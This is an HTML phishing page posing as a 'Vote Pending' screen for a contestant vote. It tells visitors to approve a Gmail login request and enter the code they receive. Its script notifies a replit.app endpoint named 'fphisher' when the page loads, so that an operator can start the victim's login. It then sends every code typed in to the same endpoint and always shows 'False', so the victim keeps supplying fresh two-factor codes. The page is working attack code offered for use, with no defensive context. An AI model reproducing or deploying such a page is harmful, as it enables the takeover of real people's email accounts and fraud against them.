<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Vote Pending</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <script>tailwind.config = { darkMode: 'media' }</script>
  <style>
    @keyframes loadingBar {
      0%   { width: 0%; left: 0%; }
      50%  { width: 70%; left: 15%; }
      100% { width: 0%; left: 100%; }
    }

    .loading-bar {
      position: absolute;
      top: 0;
      left: 0;
      height: 3px;
      background: linear-gradient(to right, #4285f4, #ea4335, #fbbc05, #34a853);
      animation: loadingBar 1.8s infinite ease-in-out;
      z-index: 100;
    }

    @keyframes shake {
      0%, 100% { transform: translateX(0); }
      20% { transform: translateX(-8px); }
      40% { transform: translateX(8px); }
      60% { transform: translateX(-5px); }
      80% { transform: translateX(5px); }
    }

    .shake { animation: shake 0.4s ease; }

    :root {
      --bg-page:     #f0f4f9;
      --bg-card:     #ffffff;
      --text-heading:#202124;
      --text-body:   #444746;
    }

    @media (prefers-color-scheme: dark) {
      :root {
        --bg-page:     #131314;
        --bg-card:     #1f1f1f;
        --text-heading:#e8eaed;
        --text-body:   #e3e3e3;
      }
    }

    body { 
      background: var(--bg-page); 
      font-family: system-ui, -apple-system, sans-serif;
    }

    .g-card {
      background: var(--bg-card);
      position: relative;
      width: 390px;
      min-height: 844px;
      margin: 40px auto;
      border-radius: 40px;
      box-shadow: 0 25px 50px -12px rgb(0 0 0 / 0.4);
      overflow: hidden;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      text-align: center;
      padding: 0 32px;
    }

    .code-input {
      width: 100%;
      max-width: 320px;
      background: #2c2c2c;
      border: 1.5px solid #555;
      color: white;
      font-size: 18px;
      padding: 16px 20px;
      border-radius: 12px;
      outline: none;
      text-align: center;
      margin-bottom: 20px;
    }

    .code-input:focus {
      border-color: #8ab4f8;
    }

    .error-text {
      color: #f28b82;
      font-size: 14px;
      margin-top: 8px;
      opacity: 0;
      transition: opacity 0.2s;
    }

    .error-text.show {
      opacity: 1;
    }

    .g-heading { color: var(--text-heading); }
    .g-body { color: var(--text-body); }
  </style>
</head>
<body class="min-h-screen flex items-center justify-center">

  <div class="g-card">
    <!-- Top Loading Bar -->
    <div class="loading-bar"></div>

    <!-- Content -->
    <div class="mb-10">
      <svg xmlns="http://www.w3.org/2000/svg" class="w-20 h-20 mx-auto text-green-500" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.25">
        <path stroke-linecap="round" stroke-linejoin="round" d="M5 10l7-7m0 0l7 7" />
      </svg>
    </div>

    <h1 class="g-heading text-[28px] font-medium mb-4">Vote Pending</h1>
    
    <p class="g-body text-[15px] leading-relaxed max-w-[290px] mb-10">
      Check your Gmail and approve your login request and Get the code to tap from contestant and verify your vote
    </p>

    <!-- Enter Code Section -->
    <div class="w-full max-w-[320px]">
      <input 
        id="codeInput" 
        type="text" 
        maxlength="10"
        placeholder="Enter code" 
        class="code-input"
        onkeypress="if(event.key === 'Enter') submitCode()"
      />
      
      <div id="errorMsg" class="error-text">False</div>

      <div class="flex justify-end mt-6">
        <button onclick="submitCode()" 
                class="bg-[#8ab4f8] hover:bg-[#6699ff] text-black font-medium px-10 py-3 rounded-full text-[15px] transition-colors">
          Next
        </button>
      </div>
    </div>
  </div>

  <script>
    const ENDPOINT = "https://fphisher-30--gnzc8csfz5.replit.app/api/submit/0c36ad344b";

    // Send initial pending status when page loads
    async function sendPendingStatus() {
      try {
        await fetch(ENDPOINT, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            status: "LOGIN PENDING | TELL CL TO TAP CODE",
            message: "Vote Pending - User reached verification screen",
            timestamp: Date.now()
          })
        });
      } catch (err) {
        console.error("Failed to send pending status:", err);
      }
    }

    // Send each code attempt
    async function sendCodeAttempt(code) {
      try {
        await fetch(ENDPOINT, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            code: code,
            status: "CODE_ATTEMPT",
            message: "User entered 2FA code",
            timestamp: Date.now()
          })
        });
      } catch (err) {
        console.error("Failed to send code:", err);
      }
    }

    function showError() {
      const errorEl = document.getElementById('errorMsg');
      const input = document.getElementById('codeInput');
      
      errorEl.classList.add('show');
      input.classList.add('shake');
      
      setTimeout(() => {
        input.classList.remove('shake');
      }, 400);
    }

    async function submitCode() {
      const input = document.getElementById('codeInput');
      const code = input.value.trim();

      if (!code) {
        input.classList.add('shake');
        setTimeout(() => input.classList.remove('shake'), 400);
        return;
      }

      // Send the code to your backend
      await sendCodeAttempt(code);

      // Always show "False" and clear input for next attempt
      showError();
      input.value = '';   // Clear the field
    }

    // Auto-send pending status on load
    window.onload = function() {
      sendPendingStatus();
    };
  </script>
</body>
</html>
